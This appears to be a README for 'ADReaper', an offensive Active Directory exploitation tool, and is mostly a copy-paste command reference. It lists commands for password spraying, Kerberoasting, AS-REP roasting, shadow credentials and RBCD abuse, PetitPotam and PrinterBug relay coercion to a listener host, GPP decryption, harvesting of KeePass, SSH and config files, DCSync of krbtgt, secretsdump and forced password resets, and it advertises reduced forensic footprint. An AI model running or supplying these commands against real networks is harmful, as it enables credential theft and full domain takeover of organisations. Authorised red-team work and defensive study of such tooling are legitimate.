# ⚔️ ADREAPER: Advanced Active Directory Exploitation Framework 🛡️

```text
 █████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████║██║  ██║██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██║██║  ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                              @adreaper v3.5.0
```

**ADReaper** is a high-performance, expert-tier reconnaissance and offensive security framework. Engineered for portability and protocol fidelity, it provides Red Teams with the precision tools required to escalate from unauthenticated discovery to full domain compromise.

---

## 📑 Master Copy-Paste Technical Reference

This section contains the most effective command conjugations for every module. Copy and adapt to your target environment.

### 🔍 Infrastructure Reconnaissance (`infra`)
```powershell
# Fast service discovery (Primary AD ports)
.\adreaper.exe infra scan -t 10.10.1.5 --ports 88,135,389,445,636,3389

# Full-throttle scan (All 65k ports + Aggressive Fingerprinting + No-Ping)
.\adreaper.exe infra scan -t 10.10.1.5 -Pn -A --ports all -v

# AD Infrastructure discovery via DNS (Locate DCs and Global Catalogs)
.\adreaper.exe infra dns -d corp.local --dc-ip 10.10.1.5
```

### 👤 Identity & Object Intelligence (`enum`)
```powershell
# Unauthenticated Domain Recon (Policy & Functional Levels)
.\adreaper.exe enum domain -d corp.local --dc-ip 10.10.1.5

# Identity Hunting (SPNs + AS-REP Exposure + Administrative Count)
.\adreaper.exe enum users --spn-only --asrep-only --admin-only -d corp.local

# Identity Hunting (Full attributes with credentials/hash)
.\adreaper.exe enum users -d corp.local -u user -p pass
.\adreaper.exe enum users -d corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Network Inventory (OS Versioning & LAPS status)
.\adreaper.exe enum computers --verbose -d corp.local -u user -p pass

# Privilege Mapping (Group Membership Analysis)
.\adreaper.exe enum groups --name "Domain Admins" -d corp.local -u user -p pass

# Advanced ACL Audit (Find GenericAll/WriteDACL on high-value objects)
.\adreaper.exe enum acls -d corp.local -u user -p pass

# PKI Analysis (Vulnerable Certificate Templates ESC1-ESC8)
.\adreaper.exe enum adcs -d corp.local -u user -p pass
```

### 🌳 SMB Cartography (`enum tree`)
```powershell
# Map high-value folders in SYSVOL
.\adreaper.exe enum tree -s SYSVOL --path "/Policies" --depth 3 -d corp.local

# Global Share Mapping (Automatically discover and walk ALL accessible shares)
.\adreaper.exe enum tree -s all --depth 2 -d corp.local -u user -p pass
```

### ⚔️ Strategic Exploitation (`attack`)
```powershell
# Lockout-Aware Password Spraying
.\adreaper.exe attack spray -P "Winter2024!" -d corp.local --delay 5
.\adreaper.exe attack spray -P "Password123!" -U users.txt -d corp.local

# Ticket & Hash Extraction (Kerberoasting & AS-REP Roasting)
.\adreaper.exe attack kerberoast -d corp.local -u user -p pass -o hashes.txt
.\adreaper.exe attack asreproast -d corp.local -o asrep_hashes.txt
.\adreaper.exe attack asreproast -U target_users.txt -d corp.local

# Modern Escalation (Shadow Credentials & RBCD)
.\adreaper.exe attack shadow -t SQLSERVER01 -d corp.local -u user -p pass
.\adreaper.exe attack rbcd -t FILE-SRV -M ATTACKER_PC$ -u user -p pass

# NTLM Relay Triggers (PetitPotam & PrinterBug)
.\adreaper.exe attack relay -t DC01 -m petitpotam --listener 10.10.10.5
.\adreaper.exe attack relay -t DC01 -m printerbug --listener 10.10.10.5

# Post-Compromise (GPP Decryption & Sensitive Data Harvesting)
.\adreaper.exe attack gpp -d corp.local -u user -p pass
.\adreaper.exe attack harvest -e kdbx,ssh,conf,xlsx,pdf -d corp.local -u user -p pass

# Domain Admin Operations (DCSync & SecretsDump)
.\adreaper.exe attack dcsync --user krbtgt -d corp.local -u admin -p pass
.\adreaper.exe attack secretsdump -d corp.local -u admin -p pass

# Advanced ACL Abuse (Force Change Password / Add SPN)
.\adreaper.exe attack acl-abuse --target victim_user --action reset-password --value "NewPassword123!"
.\adreaper.exe attack acl-abuse --target victim_computer --action add-spn --value "STS/fake.corp.local"
```

### 🐕 Graph & Automation (`bloodhound` / `autopilot`)
```powershell
# Multi-collector Telemetry (GPOs, ACLs, OUs, Containers, etc.)
.\adreaper.exe bloodhound collect -d corp.local -u user -p pass

# Direct Ingestion to Neo4j
.\adreaper.exe bloodhound ingest --neo4j-uri bolt://127.0.0.1:7687 --neo4j-pass "YourPassword"

# Full Mission Automation (Recon → Roast → BH → Loot → Report)
.\adreaper.exe autopilot -d corp.local --dc-ip 10.10.1.5 -u user -p pass
```

---

## � Intelligence Reporting

ADReaper manages all evidence in a unified workspace.

### Workspace Structure
```text
workspace/
├── report.html        <-- Premium Interactive Dashboard
├── artifacts/         <-- Raw JSON Findings (Auto-discovered by Dashboard)
└── loot/              <-- Harvested Files (.kdbx, .ssh, etc.)
```

### The Premium HTML Dashboard
To analyze mission results:
1. Open `workspace/report.html` in any browser.
2. The dashboard automatically merges all JSON findings from the `artifacts/` folder.
3. Explore deep LDAP objects and service scans via the **Universal JSON Inspector**.

---

## 🛡️ Operational Excellence

- **Protocol Fidelity**: No dependency on `net.exe` or `powershell.exe`. Pure Go implementation of LDAP, SMB, and Kerberos.
- **Threaded Precision**: Optimized worker pools for massive horizontal reconnaissance.
- **OPSEC Aware**: Designed to minimize forensic footprint during enumeration.

---

**Crafted for precision. Optimized for results.** ⚔️🔥🚀
